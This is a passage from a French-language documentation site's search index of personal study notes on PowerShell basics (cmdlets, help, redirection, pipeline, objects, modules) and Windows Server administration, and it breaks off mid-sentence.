4872  5996  9944  10796 13496 14300 15896 19284 20224 \n20356  20460  20780  20948  21652  24152 24340 25888 25912 27600 29756 2024  2072  6748  7628  9136  9144  1692  9876  21452 4000  5812  0     3428  13868 8180  16464 27468 14332 12152 6860  1868  1876  4356  5836  4876  8816  11104 \n13320  17640  18744  19124  19184  19188 24596 24612 24656 24784 27312 6996  4308  7024  7184  12340 3588  5484  14536 15160 15464 10128 15356 6772  19684 25220 21992 22132 22472 22512 6788  20228 6812  15908 22348 236   20140 6836  \n18908  9844   14208  16396  16800  16868 22752 24080 30440 16564 4892  204   19052 19036 1848  1800  20636 11736 1244  6724  6056  6852  6984  16600 6844  1280  1580  1712  1996  2056  2164  2180  2276  2284  2292  2408  2412  2460  \n2468   2576   2600   2604   2632   2648  2672  2808  2816  2912  2952  3040  3224  3324  3388  3396  3476  3556  3600  3712  4244  4252  4260  4340  4424  4484  4496  4780  4880  5424  5452  5716  5724  5860  5884  6168  6236  6632  \n6716   6740   6764   6796   6804   6896  6920  6960  6976  7548  7708  9068  9632  9968  10324 10576 10732 11240 12992 13052 13240 13352 13624 13776 13888 13896 14840 14860 15596 15852 15928 16648 17096 21032 22248 22800 23112 23152 \n23448  26088  27572  29788  4      24280 27380 3744  15968 6908  16820 6872  6880  6936  22584 6944  20340 22632 16480 2560  17268 19904 1780  1932  6360  5300  6536  6924  9260  3920  6888\n</code></pre>"},{"location":"Windows/Powershell/Presentation_de_Powershell/","title":"Powershell","text":"<p>Powershell est le dernier shell de windows powershell est un interpreteur de commande il permet de creer et lancer des scripts il est orient\u00e9 objet comme certain langage de dev. Il s'appuie sur des bibliotheque .net Framework c'est bibliotheque permettent entre autre de creer des scirpts plus aou moins elbaor\u00e9 ave des fenetre graphique.</p> <p>1ere version nativement pr\u00e9sente depuis winserveur 2008 fin 2006 mais on pouvait l'installer sur XP/Vista et serveur2003 Powershell est mont\u00e9e en version avec le temps, apportant des nouvelles commande, foncitonnalit\u00e9, securit\u00e9 d'utilisation, am\u00e9lioration. Version 5 dans la vid\u00e9o (version 7 en r\u00e9alite sur win11) acces via la console powershell ou la console graphique ISE (integrated Scripting Environment) = console orient\u00e9 scripting Outils tiers pour manipuler powershell comme avec windows terminal (dispo sur mwindows store ou sur git), \u00e9galemetn avec Visual Studio Code.</p> <p>Pour connaitre la version du powershell pris en charge sur le poste :</p> <pre><code>$PSVersionTable\n(contient plusieurs informations dont celle de la version de PS)\n</code></pre> <p>Il est important de la connaitre car dans la plupart des cas les entreprises possede des parcs de machine heterogene ce qui implique une heterogeneit\u00e9 des OS, en gros une \u00e9quipe de tech peut avori a gere des OS clients WIN10/WIN7 des OS serveur 2012R2/2016/2019 si vous elabor\u00e9 un script depuis un poste Win10 vous etes en PS5.1, il est possible de le script ne fonctionne pas depuis un win serveur 2012 R2 ou un WIN7, le script a peut etre elabor\u00e9 sur une version de powershell comportant des commandes n'existant pas sur une version ult\u00e9rieur. Autre informations utile dans la commande $PSVersionTable, il s'agit PSCompatibleVersion elle indique la retrocompatibilit\u00e9 fonctionne dans la console pr\u00e9sente.</p> <p>Les commandes Powershell... s'appel des cmdlets</p> <ul> <li>elles sont intuitives ont peut les retrouver facilement par deduction et facilement comprendre leurs roles</li> <li>elles sont toutes compos\u00e9 d'un verbe et d'un nom s\u00e9par\u00e9 par un \"-\"</li> <li>Verbes les plus courant : Get, Set, remove, Add, New</li> <li>les noms dependent du contexte d'utilisation : LocalUser, NetAdapter, Alias, Variable (ils depdnent de l'objet que l'on souhaite utiliser) les cmdlets peuvent pocceder des alias (des surnoms) plus rapide a utiliser que les cmdlets elle memes Get-Alias permet d'afficher les alias powershell Get-Verbe affiche la liste des verbes que l'on peut utiliser dasn une cmdlets New-LocalUser : permet de creer un nouvelle utilisateur local dans l'ordinateur</li> </ul> <p>chaque cmdlets est concu pour remplir une tache specifique elle ne sont pas sensible a la casse elle comporte des parametre (obligatoires ou optionnels)... ...avec des arguments (aucun ou plusieurs) Peuvent posseder des alias</p> <pre><code>Get-ChildItem -path c:\\users\n\nGet-ChildItem = cmdlets\n-path = Parametre\nc:\\users = argument\n</code></pre>"},{"location":"Windows/Powershell/Redirection_de_flux/","title":"Redirection de flux","text":"<p>Une Cmdlets donne un ordre au materiel dans le but d'obtenir un resultat, Elle recoit cet ordre par l'entr\u00e9e standard ou <code>Stdin ou 0</code> par d\u00e9faut l'ordre est donn\u00e9e par une entr\u00e9e (le clavier)</p> <p>une fois le r\u00e9sukltat obtenu il est renvoy\u00e9 vers la sortie standard (ou Stdout = 1) par d\u00e9faut le r\u00e9sultat est affich\u00e9 a l'ecran</p> <p>Parfois l'ordre donn\u00e9 ne peut renvoyer de r\u00e9sultat, si celui-ni n'est pas executable a cause d'une cmdlets inconnu du systeme, une syntaxe incorrect, manque de privilege</p> <p>le systeme renvoi 1 ou des erreurs (ou Stdr = 2) par d\u00e9faut les erreurs sont egalement remont\u00e9e a l'ecran</p> <p>C'est mecanisme sont appele les flux standard</p>"},{"location":"Windows/Powershell/Redirection_de_flux/#rediriger-ces-flux","title":"Rediriger ces flux","text":"<p>Rediriger des flux dans un fichier, au lieu de l'ecran, peut avoir un interet pour conserver les r\u00e9sultats dans le temps afin de les retraiter, examiner des erreurs ou analyser et creer des rapports de script.</p> <p></p> <p>Les flux d'une commande peuvent \u00eatre redirig\u00e9s ou fusionn\u00e9s \u00e0 votre convenance. Pour cela, il suffit d'utiliser le caract\u00e8re <code>&gt;</code> pour la redirection avec ou sans l'esperluette <code>&amp;</code> pour une fusion :</p> <p><code>&gt;</code> Redirection vers un fichier (cr\u00e9ation/Ecrasement)</p> <p>Get-localUser &gt; c:\\temp\\localUserList.txt vas envoy\u00e9 directement le r\u00e9sultat dans le fichier sans l'afficher \u00e0 l'ecran</p> <p><code>&gt;&gt;</code> Redirection vers un fichier (mode ajout a la fin d'un fichier, creation si fichier inexistant) <code>&gt;&amp;</code> Fusion de flux <code>*&gt;</code> Redirige tous les flux (vers un fichier par exemple)</p> <ul> <li>Exemples :</li> </ul> <p>2&gt; Redirige les avertissements vers un fichier 2&gt;&amp;1 Fusionne les avertissements avec la sortie standard</p>"},{"location":"Windows/Powershell/Utilisation_du_PipeLine/","title":"Le Pipeline","text":"<p>il permet de transmettre le r\u00e9sultat de la sortie standard d'une <code>cmdlets</code> dans l'entr\u00e9e standard d'une autre <code>cmdlets</code> Ainsi le resultat de la <code>cmdlets 1</code> sera directement trait\u00e9 par la <code>cmdlets 2</code>. Cela peut, eventuellement, permettre de chainer 1,2,3 ... cmdlets \u00e0 la suite.</p> <p></p> <p>Pour reprendre l'exemple du dessin en faisant un <code>Get-NetAdapter</code>voici la liste que nous renvoi le shell</p> <p></p> <p>Maintenant si je ne veux que les noms, status &amp; vitesse des cartes reseaux je vais utiliser le <code>|</code> pour chainer ma 2eme <code>cmdlet = select</code> afin de trier mes resultats.</p> <p></p>"},{"location":"Windows/Powershell/aide_de_powershell/","title":"Systeme d'aide Powershell","text":"<p>Powershell propose de l'aide pour l'utilisation et la comprehension de ce langage</p> <p>Systeme d'aide int\u00e9gr\u00e9 complet pour :</p> <ul> <li>obtenir des informations sur l'usage des commandes</li> <li>obtenir des informations sur les concepts de powershell</li> </ul> <p>PS v1 et v2 aide int\u00e9gr\u00e9 nativement PS v3 et plus aide telechargeable (sur internet, sur un serveur local) en anglais avantage: mettre a jour l'aide, obtenir les dernieres version actualis\u00e9es</p> <p>la mise a jour de l'aide est indispensable au debut de l'utilisation de PowerShell Pour effectuer les maj de l'aide il faut etre administrateur. cmdlets pour maj l'aide via internet : Update-help [-force] pour outrepasser la limite d'une MAJ/j</p> <p>Possibilit\u00e9 \u00e9galement de faire la maj via un serveur priv\u00e9e pour un systeme non connect\u00e9 a internet. Pr\u00e9-requis avoir un d\u00e9pot local (sur un srveur d'entreprise)</p> <pre><code>cmdlets : Update-Help -SourcePath \\\\chemin\\vers\\aide\\powershell -UIculture enen-US -credential\n</code></pre> <p>Pour utiliser l'aide PS on peut utliser :</p> <ul> <li>cmdlets Get-Help <code>recherche</code> pour un affichage entier</li> <li>Help <code>recherche</code> pour un affichage page par page</li> <li>Man <code>recherche</code> pour 'manual' emprunter du monde unix est un alias de HELP</li> <li> <p><code>recherche</code> -? (disponible depuis toutes les cmdlets)</p> </li> <li> <p>Get-help Disable-LocalUser = Affiche l'aide de la cmdlets Disable-LocalUSer</p> </li> <li>help help = affiche \"l'aide de l'aide\" page par page</li> <li>Man about_variables</li> <li>Affiche le manuel d'utilisation des variables PS, page par page</li> <li>Help about_* = affiche la liste des concepts disponibles</li> <li>[Permet d'avoir une lecon au sujet de la notion de variable et de son utilisation]</li> </ul> <p>toutes les sections d'aide commencant <code>about_</code> apporte des info sur une notion du langage PS</p> <p>Astuces:</p> <ul> <li>Get-help -Examples <code>recherche</code> =affiche les exemples d'utilisation de la cmdlets souhait\u00e9</li> <li>Get-help -showWindows <code>recherche</code>&gt; = affiche l'aide complete dans une fenetre s\u00e9par\u00e9e</li> <li>Get-help -Online <code>recherche</code> = Affiche l'aide \u00e0 jour d\u00e9taill\u00e9e disponible sur les serveurs Microsoft (navigateur internet requis)</li> </ul>"},{"location":"Windows/Powershell/m17_cmdlet/","title":"M17 cmdlet","text":""},{"location":"Windows/Powershell/m17_cmdlet/#les-cmdlet","title":"Les CmdLet","text":"<p>A la diff\u00e9rence du syst\u00e8me de commande CMD PowerShell utilisent des cmdlets. les cmdlets sont des commandes qui vont \u00eatre constitu\u00e9es de 2 \u00e9l\u00e9ments :  </p> <ul> <li>un verbe d'action</li> <li>un nom  </li> </ul> <p>La constitution d'une cmdlet  </p> <ul> <li>le verbe (ex: GET)  </li> <li>le \"-\" qui va agir comme le lien entre le verbe et le nom  </li> <li>le nom qui va indiquer la fonctionnalit\u00e9, l'objet, la commande ce sur quoi le verbe va agir.  </li> </ul> <p>Les cmdlets sont toujours utilis\u00e9es au singulier. Les verbes d'action seront toujours d\u00e9termin\u00e9s par les modules pr\u00e9sents dans la console powershell.  </p> <p>Les cmdlets sont parlantes, on se rend a la lecture du r\u00e9sultat attendu. En exemple, \"Get-volume\" :  </p> <ul> <li>le verbe \"Get\" va permettre d'obtenir la liste des volumes disponibles sur le syst\u00e8me d'exploitation.  </li> </ul> <p>Chaque commande PowerShell va \u00e9galement disposer de param\u00e8tres n\u00e9cessaires au bon fonctionnement de la commande. Une commande peut disposer de plusieurs param\u00e8tres.  </p> <p>Chaque param\u00e8tres sera indiqu\u00e9e avec un \"-\". La cmdlets \"Get-LocalUser\", par exemple, va nous permettre d'obtenir la liste des utilisateurs locaux. Si on souhaite obtenir un utilisateur particulier, Il faudra utiliser le param\u00e8tre \"-name\" \u00e0 laquelle on va fournir une valeur (le nom de l'utilisateur).  </p> <p>Cette valeur sera d\u00e9clar\u00e9e comme un argument et permettra \u00e0 la cmdlet de n'agir que sur cette valeur.  </p> <p>Exemple de cmdlet PowerShell</p> Get-LocalUserGet-localUser -name <pre><code>Get-LocalUser\nName               Enabled Description\n----               ------- -----------\nAdministrateur     False   Compte d\u2019utilisateur d\u2019administration\nDefaultAccount     False   Compte utilisateur g\u00e9r\u00e9 par le syst\u00e8me.\nInvit\u00e9             False   Compte d\u2019utilisateur invit\u00e9\n</code></pre> <pre><code>get-localUser -name Math\nName Enabled Description\n---- ------- -----------\nMath True\n</code></pre>"},{"location":"Windows/Powershell/m17_cmdlet/#get-command","title":"<code>Get-Command</code>","text":"<p><code>Get-Command</code> permet de rechercher et d'afficher les commandes disponibles. La recherche se fait sur le param\u00e8tre <code>-Name</code>.  </p> <p>L'utilisation du caract\u00e8re <code>*</code> permet de substituer une cha\u00eene de caract\u00e8res.  </p> <p><code>Get-command</code> permet \u00e9galement d'effectuer uen recherche sur le param\u00e8tre <code>-Verb</code>.  </p>"},{"location":"Windows/Powershell/m17_cmdlet/#get-help","title":"<code>Get-Help</code>","text":"<p>Elle permet de comprendre comment utiliser la commande trouv\u00e9e via <code>Get-Command</code>. Toutes Cmdlet comporte un manuel. Celui-ci est disponible avec la commande <code>Get-Help</code> suivi du param\u00e8tre <code>-Name \"la Cmdlet concern\u00e9e\"</code>.  </p> <p>L'aide de la commande est affich\u00e9 dans la console. Nous pouvons utiliser des param\u00e8tres suppl\u00e9mentaires afin d'am\u00e9liorer les informations obtenues.  </p> <p>L'aide des commandes est r\u00e9parties en cat\u00e9gories. Le param\u00e8tres <code>-Full</code> permet d'afficher toutes les cat\u00e9gories disponibles dans l'aide d'une commande.  </p> <p>On obtient une aide compl\u00e8te plus d\u00e9taill\u00e9e avec des exemples d'utilisation de commande.  </p> <p>Le param\u00e8tre <code>-Online</code> permet de suivre le lien fourni dans l'aide et de l'ouvrir dans un navigateur web. L'aide en ligne fournit la version la plus \u00e0 jour avec des liens vers des commandes annexes.  </p> <p>Le param\u00e8tre <code>-Examples</code> permet d'afficher uniquement les exemples d'utilisation de la commande.  </p> <p>Pour faciliter la lecture de l'aide, PowerShell met \u00e0 disposition une fen\u00eatre avec un champ de recherche. Cela permet de filtrer les cat\u00e9gories, copier-coller des exemples, etc.  </p>"},{"location":"Windows/Powershell/m17_cmdlet/#update-help","title":"Update-Help","text":"<p>Il est possible de mettre \u00e0 jour l'ensemble des fichiers d'aide avec la commande :  </p> <pre><code>PS &gt; Update-Help\n</code></pre> <p>Sans param\u00e8tres, cette commande va tenter de chercher sur le web les mises \u00e0 jour de l'aide en passant par le service Windows Update. Dans le cas o\u00f9 le service serait inaccessible, il est possible d'indiquer une source locale contenant les fichiers d'aide.  </p> <pre><code>PS &gt; Update-Help -SourcePath D:\\PowerShell\n</code></pre> <p>Il est \u00e9galement possible de choisir un langage.  </p> <pre><code>PS &gt; Update-Help -SourcePath D:\\powerShell-UICulture En-US\n</code></pre>"},{"location":"Windows/Powershell/m17_cmdlet/#la-commande-de-protection","title":"La commande de Protection","text":"<p>L'\u00e9x\u00e9cution de script est par d\u00e9faut soumise \u00e0 une forte restriction. Le niveau de confiance requis pour l'\u00e9x\u00e9cution est modifiable :  </p>"},{"location":"Windows/Powershell/m17_cmdlet/#les-modules","title":"Les modules","text":"<p>Chaque cmdlet provient d'un module PowerShell. Les modules PowerShell sont des fichiers portant l'extension .PSM1. La commande <code>Get-Module</code> permet de voir les modules actuellement disponibles dans PowerShell.  </p>"},{"location":"Windows/Powershell/m17_cmdlet/#les-modules-ajout","title":"Les modules - Ajout","text":"<p>Apr\u00e8s la r\u00e9cup\u00e9ration d'un fichier PSM1 pour conna\u00eetre l'emplacement disponible, il faut saisir la commande : <pre><code>PS&gt; $env:PsModulePath\n</code></pre></p> <p>Apr\u00e8s la copie du fichier dans l'emplacement, on importe le module dans la console : <pre><code>PS &gt; Import-Module -Name \" Le nom du dossier contenant le module \"\n</code></pre></p> <p>Puis on v\u00e9rifie l'importation : <pre><code>PS &gt; Get-Command -module \" Le nom du module \"\n</code></pre></p>"},{"location":"Windows/Powershell/m17_cmdlet/#la-personnalisation-de-la-console","title":"La personnalisation de la console","text":"<p>Il est possible de modifier les propri\u00e9t\u00e9s de la console PowerShell en faisant un clic droit sur le bandeau puis en cliquant sur propri\u00e9t\u00e9s.  </p> <p>La console se personnalise par le choix d'une police de la taille des caract\u00e8res ainsi que des couleurs de caract\u00e8res.  </p> <p>Il est \u00e9galement possible de cr\u00e9er un profil personnalis\u00e9 en saisissant la commande :  </p> <pre><code>PS &gt; New-Item -Path $Profile -Type File -Force\n</code></pre> <p>Cette commande \u00e9crit dans le dossier Documents de l'utilisateur actuel un fichier PS1 qui peut contenir des commandes qui seront ex\u00e9cut\u00e9es \u00e0 l'ouverture de la console PowerShell.  </p>"},{"location":"Windows/Powershell/m17_fiche_cmdlet/","title":"M17 fiche cmdlet","text":""},{"location":"Windows/Powershell/m17_fiche_cmdlet/#fiche-ecf-cmdlet","title":"fiche ECF Cmdlet","text":""},{"location":"Windows/Powershell/m17_initiation_powershell/","title":"Powershell","text":""},{"location":"Windows/Powershell/m17_initiation_powershell/#evolution-de-powershell","title":"Evolution de PowerShell","text":"<p>PowerShell a \u00e9t\u00e9 mis en place \u00e0 partir de l'ann\u00e9e 2006, sur les OS Microsoft Windows XP Sp 2, Windows Vista et Windows Server 2003 Sp1. Cette version disposait de 129 (130?) commandes r\u00e9parties sur 5 modules.  </p> <p>La version actuelle et la version 5.1, directement int\u00e9gr\u00e9e au syst\u00e8me d'exploitation client et au syst\u00e8me d'exploitation serveur. Actuellement elle m\u00eame \u00e0 disposition pr\u00e8s de 2800 commandes et permet la mise en place de modules additionnels. Ces modules vont permettre d'ajouter des fonctionnalit\u00e9s pour administrer une infrastructure en ligne, type Microsoft azure mais \u00e9galement des produits Microsoft tiers comme Microsoft Exchange. C'est un outil flexible, performant, s'adaptant aux besoins d'un technicien pour la gestion d'une infrastructure Microsoft. Chaque mont\u00e9e en version de powershell ajoute de nouvelles commandes, des m\u00e9thodes et des fonctions. Elle permet la mise \u00e0 jour des commandes d\u00e9ja pr\u00e9sentes dans les versions de powershell, Elle met \u00e0 disposition de nouveaux modules et met \u00e9galement mettre \u00e0 jour la console powershell (l'interpr\u00e9teur de commande) avec des outils de personnalisation, des commandes additionnelles et \u00e9galement la prise en charge des modules constructeurs. Ces modules constructeurs comme ceux de HPE, Cisco, Sonic Hall, permettent de g\u00e9rer un mat\u00e9riel tiers, qui n'ex\u00e9cute pas un syst\u00e8me d'exploitation Microsoft, mais qui pourront \u00eatre administr\u00e9 \u00e0 travers la console powershell.  </p>"},{"location":"Windows/Powershell/m17_initiation_powershell/#difference-powershell-et-powershell-core","title":"Diff\u00e9rence PowerShell et PowerShell Core","text":"<p>PowerShell existe en version PowerShell Core. Cette version a \u00e9t\u00e9 introduite en ao\u00fbt 2016, cette version est bas\u00e9e sur le Frameworks.NET. PowerShell Core est open-source. Il est multiplateforme, \u00e0 la diff\u00e9rence de PowerShell qui n'est pr\u00e9sent que sur les syst\u00e8mes d'exploitation Microsoft. PowerShell Core est disponible sur la totalit\u00e9 des plateformes trouvable dans une infrastructure informatique. La mont\u00e9e en version de PowerShell Core suit les \u00e9volutions du Frameworks.NET (version 3.0), PowerShell Core est actuellement en version 7.0. Le fait qu'il soit open-source permet de cr\u00e9er ses propres modules, d'adapter des modules \u00e0 nos propres besoins et de ne pas \u00eatre limit\u00e9 dans les plateformes d'utilisation. Le fait que Powershell Core soit open-source est une \u00e9volution majeure pour Microsoft. En effet, Microsoft a indiqu\u00e9 son besoin d'ouvrir les fonctionnalit\u00e9s de ces logiciels. Depuis Windows 10, les OS clients Microsoft int\u00e8gre le bash (nativement disponible sur les distributions Linux et autres syst\u00e8mes open-source). Par ailleurs les distributions Linux accueil \u00e9galement le serveur SQL de Microsoft. Le catalogue Microsoft Azure, l'environnement cloud Microsoft, int\u00e8gre maintenant le support de machines virtuelle multiplateformes. Ceci permet \u00e0 Microsoft de balayer avec PowerShell Core l'int\u00e9gralit\u00e9 des fonctionnalit\u00e9s disponibles dans une infrastructure. La version actuel de powershell Core est la 7.  </p> <p>PowerShell Core propose des preview mensuel et une mont\u00e9e de version compl\u00e8te annuellement.  </p>"},{"location":"Windows/Powershell/m17_langage_objet/","title":"M17 langage objet","text":""},{"location":"Windows/Powershell/m17_langage_objet/#langage-oriente-objet","title":"langage orient\u00e9 objet","text":"<p>Contrairement au Bash ou au CMD, PowerShell est un langage orient\u00e9 objet.  </p> <p>ex: on recherche l'utilisateur local \"Tom\" en CMD et en PowerShell.  </p> <p>La composition d'un objet PowerShell :  </p> <ul> <li>Un objet est d\u00e9fini par un ensemble de propri\u00e9t\u00e9s et de m\u00e9thodes.  </li> <li>On peut comparer un objet PowerShell \u00e0 un objet du quotidien.  </li> <li>Un feutre poss\u00e8de des propri\u00e9t\u00e9s et des m\u00e9thodes.  </li> </ul>"},{"location":"Windows/Powershell/m17_langage_objet/#get-service","title":"<code>Get-Service</code>","text":"<p>La commande  <pre><code>PS &gt; Get-Service\n</code></pre> renvoie un objet \"service Windows\".  </p>"},{"location":"Windows/Powershell/m17_langage_objet/#get-member","title":"<code>Get-Member</code>","text":"<p>La CMDLET <pre><code>PS &gt; Get-Member\n</code></pre> est la commande qui permet de conna\u00eetre :  </p> <p>Elle s'utilise exclusivement \u00e0 la suite d'une commande dont le verbe est <code>Get</code>. <pre><code>PS &gt; Get-LocalUser | Get-Member\n</code></pre> Le <code>PIPE</code> ou <code>|</code> est \u00e0 ajouter aux deux commandes vues pr\u00e9cedemment <code>Get-Command</code> et <code>Get-Help</code>. Ces trois commandes sont dites commandes cl\u00e9s pour pratiquer le langage PowerShell. <pre><code>PS &gt; Get-Command | Get-Help | Get-Member\n</code></pre> [rajouter les explications de la d\u00e9mo]</p>"},{"location":"Windows/Powershell/m17_langage_objet/#les-objets","title":"Les Objets","text":""},{"location":"Windows/Powershell/m17_langage_objet/#proprietes","title":"Propri\u00e9t\u00e9s","text":"<p>Les propri\u00e9t\u00e9s d'un objet PowerShell sont d\u00e9finies par le type d'objet. La valeur des propri\u00e9t\u00e9s peut \u00eatre de diff\u00e9rents types.  </p>"},{"location":"Windows/Powershell/m17_langage_objet/#propriete-valeur","title":"Propri\u00e9t\u00e9 &amp; Valeur","text":"<p>La propri\u00e9t\u00e9 d'une valeur peut \u00eatre modifi\u00e9e avec le verbe <code>Set</code> en d\u00e9but de commande suivi du nom de l'objet. <pre><code>PS &gt; Set-Service -Name wsearch -DisplayName \"Service de recherche windows\"\n</code></pre> On effectue \u00e0 nouveau la commande <code>PS &gt; Get-Service -ServiceName wsearch</code></p> <p>[rajouter les explications de la d\u00e9mo]</p>"},{"location":"Windows/Powershell/m17_langage_objet/#methodes","title":"M\u00e9thodes","text":"<p>Les objets disposent \u00e9galement de m\u00e9thodes parfois communes \u00e0 plusieurs types d'objets. Contrairement aux propri\u00e9t\u00e9s, les m\u00e9thodes effectuent des actions sur la totalit\u00e9 de l'objet ou sur la valeur d'une ou plusieurs propri\u00e9t\u00e9s d'un objet.  </p> <p>Pour appliquer une m\u00e9thode, on utilise la commande permettant d'obtenir un objet.  </p> <p>On encadre la commande avec des parenth\u00e8ses afin d'appliquer la m\u00e9thode. On ajoute la m\u00e9thode pr\u00e9c\u00e9d\u00e9e d'un point de concat\u00e9nation, puis \u00e0 la suite de la m\u00e9thode on ajoute entre parenth\u00e8sela valeur n\u00e9cessaire \u00e0 la m\u00e9thode. <pre><code>PS &gt; (Get-Date).AddDays(*)\n</code></pre> Ici la m\u00e9thode <code>AddDays</code> ajoute un jour de plus \u00e0 l'objet <code>System.DateTime</code> renvoy\u00e9 par la commande <code>Get-Date</code>.  </p> <p>[rajouter les explications de la d\u00e9mo]</p>"},{"location":"Windows/Powershell/m17_manipulation_objets/","title":"M17 manipulation objets","text":""},{"location":"Windows/Powershell/m17_manipulation_objets/#introduction","title":"Introduction","text":"<p>Comme abord\u00e9 pr\u00e9c\u00e9demment, le r\u00e9sultat d'\u00e9x\u00e9cution de commandes peut \u00eatre compos\u00e9 d'un ensemble objets. <pre><code>PS &gt; Get-Service\n</code></pre></p> <p>Le nombre d'objets \u00e9tant souvent \u00e9l\u00e9v\u00e9, il est important de pouvoir s\u00e9lectionner et mettre en forme le r\u00e9sultat d'une commande. <pre><code>PS &gt; Get-EventLog\n</code></pre></p> <p>L'utilisation de redirections au moyen de pipeline (caract\u00e8re <code>|</code>) permet d'effectuer des commandes de triage, de mise en forme, de selection et \u00e9galement de conditionnerle r\u00e9sultat final.  </p>"},{"location":"Windows/Powershell/m17_manipulation_objets/#le-pipe","title":"Le pipe <code>|</code>","text":"<p>Le pipe <code>|</code> permet de passer un ou plusieurs objets \u00e0 la commande qui suit. <pre><code>PS &gt; Get-Service | Get-Member\n</code></pre></p> <p>le pipe <code>|</code> peut \u00eatre utilis\u00e9 \u00e0 plusieurs reprises, tant que l'on dispose d'objets \u00e0 traiter. <pre><code>PS &gt; Get-EventLog -LogName \"System\" | Select-Object Name | Format-Table\n</code></pre></p> <p>Le pipe <code>|</code> utilise une variable r\u00e9serv\u00e9e qui est $PSItem. Cela permet de cibler une propri\u00e9t\u00e9 d'un objet. <pre><code>PS &gt; Get-Process | Select Name,Id | Where { $PSItem.Id-gt 1500 -and $PSItem.ID-lt 2000 }\n</code></pre> Les 2 <code>Id</code> sont des propri\u00e9t\u00e9s.  </p>"},{"location":"Windows/Serveur/administration_windows/","title":"Administration Windows","text":""},{"location":"Windows/Serveur/administration_windows/#windows-serveur","title":"Windows Serveur","text":"<p>Au m\u00eame titre que la version client, les \u00e9ditions serveur recoivent des releases permettant l'am\u00e9lioration de l'OS en mati\u00e8re de s\u00e9curit\u00e9, de performances etc.  </p>"},{"location":"Windows/Serveur/administration_windows/#les-differentes-editions","title":"Les diff\u00e9rentes \u00e9ditions","text":""},{"location":"Windows/Serveur/administration_windows/#les-services-pris-en-charge","title":"Les services pris en charge","text":"<p>L'installation d'un serveur en entreprise permet d'allouer des services sp\u00e9cifiques facilitant la gestion de l'infrastructure de cette m\u00eame entreprise. Un ensemble de services est nativement pris en charge par les syst\u00e8mes d'exploitation Windows Server:  </p> <p>Les services de domaine :  </p> <ul> <li>Services de domaine Active Directory (AD DS) : Fournit la gestion de contextes de domaine Active Directory;</li> <li>Service de f\u00e9d\u00e9ration AD (AD FS) : Services f\u00e9d\u00e9r\u00e9s de gestion des identit\u00e9s;</li> <li>Services de gestion des droits AD (AD RMS) : Protection des ressources contre une utilisation non autoris\u00e9e, bas\u00e9e sur des certificats ( permettant notamment d'interdire la copie ou l'impression d'un fichier);</li> <li>Service de certificat AD (AD CS) : Service de gestion d'une autorit\u00e9 de certification (fournit une infrastructure \u00e0 clef publique);</li> </ul> <p>Autres services pris en charge :  </p> <ul> <li>DNS : Service de r\u00e9solution de noms d'h\u00f4tes;</li> <li>DHCP : Service de gestion de l'adressage IP;</li> <li>Hyper-V : Service de virtualisation Microsoft;</li> <li>WDS : Service de d\u00e9ploiement d'OS Windows \u00e0 travers le r\u00e9seau;</li> <li>WSUS : Service de prise en charge de mise \u00e0 jour de produit Microsoft;</li> <li>Service d'impression et de num\u00e9risation : Service permettant la gestion centralis\u00e9e des p\u00e9riph\u00e9riques d'impressions et de num\u00e9risations.</li> </ul> <p>D'autre solutions, outils, applications peuvent \u00eatre pris en charge et mis en oeuvre comme par exemple un serveur de messagerie EXchange, un serveur de base de donn\u00e9es Microsoft SQL etc.  </p>"},{"location":"Windows/Serveur/administration_windows/#installation-du-systeme-et-composants","title":"Installation du syst\u00e8me et composants","text":""},{"location":"Windows/Serveur/administration_windows/#installation","title":"Installation","text":""},{"location":"Windows/Serveur/administration_windows/#standard","title":"Standard","text":"<p>Il s'agit de l'installation avec environnement graphique (GUI : Graphic User Interface)  </p>"},{"location":"Windows/Serveur/administration_windows/#minimale-server-core","title":"Minimale / Server Core","text":"<p>Il s'agit du mode d'installation par d\u00e9faut et demandant le moins de ressource. Ce mode d'installation est disponible depuis Windows Server 2008. Cette installation sera en \"Core\" sans interface graphique et exclusivement en commande Powershell</p>"},{"location":"Windows/Serveur/administration_windows/#les-composants","title":"Les composants","text":""},{"location":"Windows/Serveur/administration_windows/#role-et-fonctionnalites","title":"R\u00f4le et Fonctionnalit\u00e9s","text":"<p>Une fois le serveur install\u00e9, des composants peuvent \u00eatre ajout\u00e9s par :  </p> <ul> <li>Le gestionnaire de Serveur (ou DashBoard)</li> <li>En commandes Powershell (exclusivement utilis\u00e9 si le serveur est install\u00e9 sans GUI)</li> </ul> <p>Il existe 2 types de composants : </p> <ul> <li>Les r\u00f4les : correspond g\u00e9n\u00e9ralement \u00e0 un service que l'on fournit \u00e0 des clients</li> <li>Les fonctionnalit\u00e9s : correspond g\u00e9n\u00e9ralement \u00e0 un outil/composant utile sur l'\u00e9l\u00e9ment sur lequel on l'ajoute</li> </ul>"},{"location":"Windows/Serveur/administration_windows/#outils-de-gestion","title":"Outils de gestion","text":"<p>les diff\u00e9rents outils sont :  </p> <ul> <li>Le gestionnaire de serveur : \u00e9l\u00e9ment central d'administration du ou des serveurs</li> </ul> <p>Via ce gestionnaire des services (vu pr\u00e9c\u00e9demment) pourront \u00eatre install\u00e9s.</p> <ul> <li>Les consoles de gestion des services (Console MMC):<ul> <li>Disponibles suite \u00e0 l'ajout d'un r\u00f4le sur le serveur</li> <li>Peuvent \u00eatre ajout\u00e9es sur un poste d'administration ne disposant pas du r\u00f4le \u00e0 g\u00e9rer</li> </ul> </li> <li>Elle peuvent \u00eatre utilisable et administrable<ul> <li>via CMD</li> <li>via Powershell, propose des \u00e9l\u00e9ments plus complexe que l'interface graphique</li> </ul> </li> </ul>"},{"location":"Windows/Serveur/administration_windows/#gestion-du-stockage","title":"Gestion du Stockage","text":""},{"location":"Windows/Serveur/administration_windows/#format-de-table-de-partition","title":"Format de table de partition","text":"MBR (historique)GPT <ul> <li>Cette table faisait partie des informations stock\u00e9es sur le premier secteur adressable du disque</li> <li>Le BIOS recherche un secteur d'amor\u00e7age sur les m\u00e9dias bootable.</li> </ul> Caract\u00e9ristiques <ul> <li>Plus faible tol\u00e9rance aux pannes</li> <li>Nom donn\u00e9e au premier secteur physique d'un disque</li> </ul> <ul> <li>A ce jour, la majorit\u00e9 des machines disposent d'un UEFI</li> <li>Les SSD sont, g\u00e9n\u00e9ralement, pr\u00e9configur\u00e9s de cette mani\u00e8re</li> <li>Meilleure performance avec les cartes m\u00e8res UEFI</li> <li>Optimiser pour les syst\u00e8mes d'exploitation en 64 bits</li> </ul> Caract\u00e9ristiques <ul> <li>Meilleure tol\u00e9rance aux pannes</li> <li>Les donn\u00e9es sont dupliqu\u00e9es sur plusieurs secteurs<ul> <li>Possibilit\u00e9 de reconstruction</li> </ul> </li> </ul> Possibilit\u00e9 de conversion <p>La conversion MBR \u2192 GPT en 